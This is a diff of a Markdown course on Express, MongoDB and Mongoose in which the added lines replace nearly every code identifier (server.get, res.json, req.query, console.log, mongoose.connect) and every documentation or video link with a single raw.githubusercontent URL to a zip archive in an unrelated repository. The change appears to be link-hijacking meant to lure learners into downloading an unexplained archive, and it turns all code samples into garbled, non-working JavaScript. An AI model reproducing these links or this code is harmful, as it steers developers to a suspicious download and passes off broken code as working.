-	- **res.sendFile(**) - for sending File
-	- **res.json** - for sending JSON 
-	- **res.sendStatus(404)** - for sending HTTP status only
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip()** - for sending HTML
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(**) - for sending File
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** - for sending JSON 
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(404)** - for sending HTTP status only
 	
 - **HTTP Request** Types we generally use :
 	- GET
@@ -599,23 +599,23 @@ Response object comprises of many properties, but important ones are :
 - Sequence of middleware is very important, as first middleware is first traversed by request.
 - Middle-wares can be used for many use cases, like loggers, authentication, parsing data etc.
 - Middle-ware can be :
-	- Application level : server.use(**middleware**) 
-	- Router level : server.get('/', **middleware**, (req,res)=>{})
-	- Built-in middleware : **express.json()** [ for parsing body data], **express.static()**[for static hosting]
+	- Application level : https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(**middleware**) 
+	- Router level : https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('/', **middleware**, (req,res)=>{})
+	- Built-in middleware : **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip()** [ for parsing body data], **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip()**[for static hosting]
 	- External Middle-wares - like **morgan**
 
 - **Request** properties (**req** is our request object)
-	- **req.ip** - IP address of client
-	- **req.method** - HTTP method of request
-	- **req.hostname** - like google.com / localhost
-	- **req.query** - for capturing query parameters from URL e.g. localhost:8080 ? **query=value**
-	- **req.body** -for capturing request body data (but its needs a middleware for body data decoding)
-	-  **req.params** - for capturing URL parameters for route path like `/products/:id` 
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** - IP address of client
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** - HTTP method of request
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** - like https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip / localhost
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** - for capturing query parameters from URL e.g. localhost:8080 ? **query=value**
+	- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** -for capturing request body data (but its needs a middleware for body data decoding)
+	-  **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** - for capturing URL parameters for route path like `/products/:id` 
 
-- **Static Hosting** : we can make 1 or more folders as static hosted using **express.static** middleware.
-	`server.use(express.static(< directory >))`
+- **Static Hosting** : we can make 1 or more folders as static hosted using **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** middleware.
+	`https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(< directory >))`
 Static hosting is like sharing a folder/directory and making its file readable as it is.
-Note : `index.html` is default file which would be read in a static hosted folder, if you don't mention any file name.
+Note : `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` is default file which would be read in a static hosted folder, if you don't mention any file name.
 
 3 major ways of sending data from client to server via request are :
 
@@ -625,11 +625,11 @@ This is easiest method to send data and mostly used in GET request.
 
 When you have URL with  `?name=Youstart&subject=express`  at end, it translates in a query string. In query string each key,value pair is separated by  `=`  and between 2 such pairs we put  `&`.
 
-To read such data in express you can use  `req.query`  :
+To read such data in express you can use  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`  :
 ```javascript
-server.get("/demo",function(req,res){
-    console.log(req.query) // prints all data in request object
-    res.send(req.query);  // send back same data in response object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/demo",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) // prints all data in request object
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip);  // send back same data in response object
 })
 ```
 
@@ -637,18 +637,18 @@ server.get("/demo",function(req,res){
 
 Make above server with API endpoint  `/demo`  as shown above :
 
-1.  Try to call this API in your browser  `http://localhost:8080/demo?name=Youstart`  - this will return a response of  `req.query`  JSON object
+1.  Try to call this API in your browser  `http://localhost:8080/demo?name=Youstart`  - this will return a response of  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`  JSON object
     
-2.  Create 3 query parameters  `name`,  `age`,  `subject`  with some values. Check the final output of  `req.query`  - can you find all data on server side. Can you send it back to client via  `res`  object.
+2.  Create 3 query parameters  `name`,  `age`,  `subject`  with some values. Check the final output of  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`  - can you find all data on server side. Can you send it back to client via  `res`  object.
     
 
 **2. Send data via Request Params**
 
 In this method you can have a URL with url path like  `/Youstart/express`  at end it translates in a param string. In param part string each value is separated by  `/`. As you can see that URL only contains  `value`  not the  `key`  part of data.  `key`  part is decided by the endpoint definition at express server
 
-server.get("/demo/:name/:subject",function(req,res){
-    console.log(req.params) // prints all data in request object
-    res.send(req.query);  // send back same data in response object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/demo/:name/:subject",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) // prints all data in request object
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip);  // send back same data in response object
 })
 
 So sequence of values matter in this case. As values sent from client are matched with  `name`  and  `subject`  params of URL later.
@@ -657,9 +657,9 @@ So sequence of values matter in this case. As values sent from client are matche
 
 Make above server with API endpoint  `/demo`  as shown above :
 
-1.  Try to call this API in your browser  `http://localhost:8080/demo/Youstart/Express`  - this will return a response of  `req.params`  JSON object
+1.  Try to call this API in your browser  `http://localhost:8080/demo/Youstart/Express`  - this will return a response of  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`  JSON object
     
-2.  Create 3 URL params  `name`,  `age`,  `subject`  . Call the URL and check the final output of  `req.params`  - can you find all data on server side. Can you send it back to client via  `res`  object.
+2.  Create 3 URL params  `name`,  `age`,  `subject`  . Call the URL and check the final output of  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`  - can you find all data on server side. Can you send it back to client via  `res`  object.
     
 
 **3. Send data via Request Body**
@@ -671,18 +671,18 @@ Final method of sending data is via body part of request. We can send data direc
 2.  Use special browsers like POSTMAN to change the body directly. (We will see this example in next classes)
     
 ```js
-server.post("/demo",function(req,res){
-    console.log(req.body) // prints all data in request object
-    res.send(req.body);  // send back same data in response object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/demo",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) // prints all data in request object
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip);  // send back same data in response object
 })
 ```
 
 
 ### Related Links/Videos
 
-1. [Middleware Explanation video](https://www.youtube.com/watch?v=qkMJL0FwiyE)
-2. [List of useful 3rd party middleware for Express](https://expressjs.com/en/resources/middleware.html)
-3. [List of HTTP response status](https://www.restapitutorial.com/httpstatuscodes.html) 
+1. [Middleware Explanation video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. [List of useful 3rd party middleware for Express](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+3. [List of HTTP response status](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) 
 
 
 
@@ -754,12 +754,12 @@ Suppose you have a resource named  `task`, Here is the example of 5 REST APIs co
 
 ###  [[ Assignments ]]
   
--  **Assignment 1** : Make an API similar to explained above for `Quotes` take dummy data from same site ([dummy json quotes](https://dummyjson.com/quotes))
+-  **Assignment 1** : Make an API similar to explained above for `Quotes` take dummy data from same site ([dummy json quotes](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip))
 
 
 ### Related Links/Videos
 
-1. [Middleware Explanation video](https://www.youtube.com/watch?v=qkMJL0FwiyE)
+1. [Middleware Explanation video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -776,7 +776,7 @@ In Our Project this will be :
 
 **Router**
 - These are like mini-application on which you can make set of Routes independently. 
-- Routers can be attached to main Server App using `server.use(router)`
+- Routers can be attached to main Server App using `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(router)`
 
 Arrange Directory in Server like this :
 
@@ -791,7 +791,7 @@ Arrange Directory in Server like this :
 
 ### Related Links/Videos
 
-1. [Model View Controller](https://www.freecodecamp.org/news/the-model-view-controller-pattern-mvc-architecture-and-frameworks-explained/)
+1. [Model View Controller](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -838,7 +838,7 @@ This will command will let you switch to a particular <dbname>
 3. Collection
 4. Document
 
-Hostname is Database server address - like `localhost` or `db.xy.com`. In mongoDB hostname generally uses mongodb protocol to connect.
+Hostname is Database server address - like `localhost` or `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`. In mongoDB hostname generally uses mongodb protocol to connect.
 So URLs are generally are of shape : `mongodb://localhost:27017`
 
 Database are topmost storage level of your data - mostly each application has 1 database - however complex application might have more than 1 databases. Database is something like `university database`
@@ -853,7 +853,7 @@ Finally document is basic entity of storage in Mongod, it looks very similar to 
 
 Mongo DB community server comes with in-bulit Mongo CLI which can act as a terminal based client. You can use the CRUD functionality from here 
 
-Read the commands [here](https://docs.mongodb.com/manual/reference/mongo-shell/)
+Read the commands [here](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 #### Assignment 1
 
@@ -901,9 +901,9 @@ Above command restore your database `accounts` from backup directory `dump`
 
 
 
-#### Using MONGODB NODE.JS DRIVER  [ OPTIONAL READING - as we will not use Mongo Driver ]
+#### Using MONGODB https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip DRIVER  [ OPTIONAL READING - as we will not use Mongo Driver ]
 
-To install MONGODB NODE.JS DRIVER use this command
+To install MONGODB https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip DRIVER use this command
 
 ```javascript
 npm install mongodb
@@ -923,11 +923,11 @@ const url = 'mongodb://localhost:27017';
 const dbName = 'myproject';
 
 // Use connect method to connect to the Server
-MongoClient.connect(url, function(err, client) {
-  assert.equal(null, err);
-  console.log("Connected correctly to server");
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(url, function(err, client) {
+  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(null, err);
+  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("Connected correctly to server");
 
-  const db = client.db(dbName);
+  const db = https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(dbName);
 
 });
 ```
@@ -936,10 +936,10 @@ Now this `db` handle can be used to perform any CRUD operation using MongoDB Nod
 
 #### CRUD Functions links
 
-1. Create - [Shell Version](https://docs.mongodb.com/manual/crud/#create-operations) /  [Node Version](http://mongodb.github.io/node-mongodb-native/3.0/tutorials/crud#insert-documents)
-2. Read - [Shell Version](https://docs.mongodb.com/manual/crud/#read-operations) /  [Node Version](http://mongodb.github.io/node-mongodb-native/3.0/tutorials/crud#findoneandupdate-findoneanddelete-and-findoneandreplace)
-3. Update - [Shell Version](https://docs.mongodb.com/manual/crud/#update-operations) /  [Node Version](http://mongodb.github.io/node-mongodb-native/3.0/tutorials/crud#updating-documents)
-4. Delete - [Shell Version](https://docs.mongodb.com/manual/crud/#delete-operations) /  [Node Version](http://mongodb.github.io/node-mongodb-native/3.0/tutorials/crud#removing-documents)
+1. Create - [Shell Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) /  [Node Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. Read - [Shell Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) /  [Node Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+3. Update - [Shell Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) /  [Node Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+4. Delete - [Shell Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) /  [Node Version](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -1011,7 +1011,7 @@ e.g. {name:1, age:1, id:0} - only show **name** and **age** and don't show **id*
 
 **MONGO ATLAS CLOUD SETUP** : Check the video in tutorial
   
- ** Enviroment Variable** : To use environment variable we can use a npm package called **dotenv** which will create new **process.env** variables. 
+ ** Enviroment Variable** : To use environment variable we can use a npm package called **dotenv** which will create new **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** variables. 
  -  Install `dotenv` using `npm install dotenv` 
  - just have use `.env` file in your root directory
  - and call `require('dotenv').config()`
@@ -1019,7 +1019,7 @@ e.g. {name:1, age:1, id:0} - only show **name** and **age** and don't show **id*
 
 ### Related Links/Videos
 
-[Mongo Atlas Setup Detailed Video](https://youtu.be/4vtFY_ijpKs)
+[Mongo Atlas Setup Detailed Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
   
 
 ## Chapter 7 - Mongoose and REST APIs
@@ -1046,10 +1046,10 @@ To connect mongoose to your database `test`, you have to use the following comma
 ```js
 
 var mongoose = require('mongoose');
-await mongoose.connect('mongodb://127.0.0.1:27017/test');
+await https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('mongodb://127.0.0.1:27017/test');
 ``` 
 
-Connection can also be stored in a variable to check whether it is connected properly or not. Also to disconnect database later on. You can read more details [Here](https://mongoosejs.com/docs/connections.html)
+Connection can also be stored in a variable to check whether it is connected properly or not. Also to disconnect database later on. You can read more details [Here](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 #### Schema
 
@@ -1061,12 +1061,12 @@ Schema is the specification according to which data object is created in Databas
 ```js
 
 const mongoose = require('mongoose');
-const Schema = mongoose.Schema;
+const Schema = https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip;
 
 const taskSchema = new Schema({
     title:  String,
     status: Boolean,
-    date: { type: Date, default: Date.now }    
+    date: { type: Date, default: https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip }    
   });
 ```
 
@@ -1089,7 +1089,7 @@ You can put a lot of conditions inside the Schema object :
 
 ```
 
-Detailed information on SchemaTypes is [Here](https://mongoosejs.com/docs/schematypes.html)
+Detailed information on SchemaTypes is [Here](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 #### Model
 
@@ -1103,10 +1103,10 @@ const { Schema } =  mongoose;
 const taskSchema = new Schema({
     title:  String,
     status: Boolean,
-    date: { type: Date, default: Date.now },    
+    date: { type: Date, default: https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip },    
   });
   
-const Task = mongoose.model('Task', taskSchema);  //Task Model to create new database objects for `tasks` Collection
+const Task = https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('Task', taskSchema);  //Task Model to create new database objects for `tasks` Collection
 
 
 ```
@@ -1127,14 +1127,14 @@ To Create new obejct in database we can use `new` keyword and create an object f
 
 ```js
 
-server.post("/task",function(req,res){
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/task",function(req,res){
     let task = new Task();
 
-    task.title = "shopping";
-    task.status = true;
-    task.date = new Date();
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip = "shopping";
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip = true;
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip = new Date();
 
-    task.save();
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip();
 })
 
 ```
@@ -1155,7 +1155,7 @@ You have to create an API Endpoint to type `POST` named `/task`. It will create 
 
 // response body should return the newly created object.
 
-res.json(task);
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(task);
 
 ```
 
@@ -1169,16 +1169,16 @@ To read new obejcts from database, one can use `find` query or similar queries. 
 
 ```js
 
-server.get("/task/:name",function(req,res){
-    Task.findOne({name:req.params.name},function(err,doc){
-        console.log(doc)  // this will contain db object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/task/:name",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip},function(err,doc){
+        https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(doc)  // this will contain db object
     })
 })
 
 
-server.get("/tasks",function(req,res){
-    Task.find({},function(err,docs){
-        console.log(docs)  // this is an array which contains all task objects
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/tasks",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({},function(err,docs){
+        https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(docs)  // this is an array which contains all task objects
     })
 })
 
@@ -1194,7 +1194,7 @@ You have to create an API Endpoint to type `GET` named `/tasks`. It will return 
 
 // response body should return the all db objects of collection tasks.
 
-res.json(tasks);
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(tasks);
 
 ```
 
@@ -1217,9 +1217,9 @@ First scenario is covered using this query. Here you are overwriting all propert
 
 ```js
 
-server.put("/task/:name",function(req,res){
-    Task.findOneAndReplace({name:req.params.name},{name:'YouStart'},{new:true},function(err,doc){
-        console.log(doc)  // this will contain new db object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/task/:name",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip},{name:'YouStart'},{new:true},function(err,doc){
+        https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(doc)  // this will contain new db object
     })
 })
 
@@ -1229,9 +1229,9 @@ Second scenario is covered using this query. Here you are only changing value of
 
 ```js
 
-server.put("/task/:name",function(req,res){
-    Task.findOneAndUpdate({name:req.params.name},{name:'YouStart'},,{new:true},function(err,doc){
-        console.log(doc)  // this will contain db object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/task/:name",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip},{name:'YouStart'},,{new:true},function(err,doc){
+        https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(doc)  // this will contain db object
     })
 })
 
@@ -1250,7 +1250,7 @@ You have to create an API Endpoint to type `PUT` named `/task/:id`. It will upda
 
 // response body should return the newly updated object.
 
-res.json(task);
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(task);
 
 ```
 
@@ -1265,9 +1265,9 @@ To Delete existing object from database we need to first find an object from dat
 
 ```js
 
-server.delete("/task/:name",function(req,res){
-    Task.findOneAndDelete({name:req.params.name},function(err,doc){
-        console.log(doc)  // this will contain deleted object object
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip("/task/:name",function(req,res){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip},function(err,doc){
+        https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(doc)  // this will contain deleted object object
     })
 })
 
@@ -1282,7 +1282,7 @@ You have to create an API Endpoint to type `DELETE` named `/task/:id`. It will d
 
 // response body should return the deleted object.
 
-res.json(task);
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(task);
 
 ```
 
@@ -1297,12 +1297,12 @@ Check using Mongo Compass/or Mongo Shell  that the record is deleted or not.
  `npm install mongoose`
  - Mongoose connection code
 ```javascript
-main().catch(err => console.log(err));
+main().catch(err => https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(err));
 
 async function main() {
-  await mongoose.connect('mongodb://127.0.0.1:27017/test');
+  await https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('mongodb://127.0.0.1:27017/test');
   
-  // use `await mongoose.connect('mongodb://user:password@127.0.0.1:27017/test');` if your database has auth enabled
+  // use `await https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('mongodb://user:password@127.0.0.1:27017/test');` if your database has auth enabled
 }
 ```
  - Mongoose **Schema** : Each schema maps to a MongoDB collection and defines the shape of the documents within that collection.
@@ -1325,14 +1325,14 @@ images: [ String ]
 
  - Mongoose **Model**  : model are built using a combination of Schema and name of Collection.
 ```javascript
-const Product  =  mongoose.model('Product', productSchema);
+const Product  =  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('Product', productSchema);
 ```
 
  - Mongoose **Document** - its is instance of a model. so Model is like a class and documents are like its objects. These documents are directly saved in mongoDB.
 ```javascript
   const document = new Product();
  // document is actually saved in database after save()
-  await document.save();
+  await https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip();
 ```
 
 Mongoose Schema/Model can act as **Model** of **Model**-View-Controller concept.
@@ -1344,40 +1344,40 @@ Mongoose Schema/Model can act as **Model** of **Model**-View-Controller concept.
 
 ```javascript
    const product = new Product();
-   await product.save()
+   await https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip()
    ```
    
 **READ** :
 
 1. **read all products** - use **GET** HTTP Method
 ```javascript
-const  products  =  await  Product.find();
+const  products  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip();
 
-const  products  =  await  Product.find({price:{$gt:500}});
+const  products  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({price:{$gt:500}});
 ```
 2. **read 1 product** - use **GET**  HTTP Method
 ```javascript
-const  product  =  await  Product.findById(id);
+const  product  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(id);
 ```
 
 **UPDATE** :
 
 1. replace product fields (all fields) - use **PUT**  HTTP Method
 ```javascript
-const  doc  =  await  Product.findOneAndReplace({_id:id},req.body,{new:true})
+const  doc  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({_id:id},https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip,{new:true})
 ```
 
 2. update only some product fields - use **PATCH**  HTTP Method
 
 ```javascript
-const  doc  =  await  Product.findOneAndUpdate({_id:id},req.body,{new:true})
+const  doc  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({_id:id},https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip,{new:true})
 ```
 
 
 **DELETE** :
 1. delete  1 product  - use **DELETE** HTTP Method
 ```javascript
-const  doc  =  await  Product.findOneAndDelete({_id:id})
+const  doc  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({_id:id})
 ```
 
 ###  [[ Assignments ]]
@@ -1401,7 +1401,7 @@ Now try to create this **user** object and **save** it to database.
 
 ### Related Links/Videos
 
-Queries in Mongoose : [Link](https://mongoosejs.com/docs/queries.html)
+Queries in Mongoose : [Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## Chapter 8 - React Integration and MERN Stack Live deployment 
@@ -1415,7 +1415,7 @@ Queries in Mongoose : [Link](https://mongoosejs.com/docs/queries.html)
   
   **CORS Issues :**
   
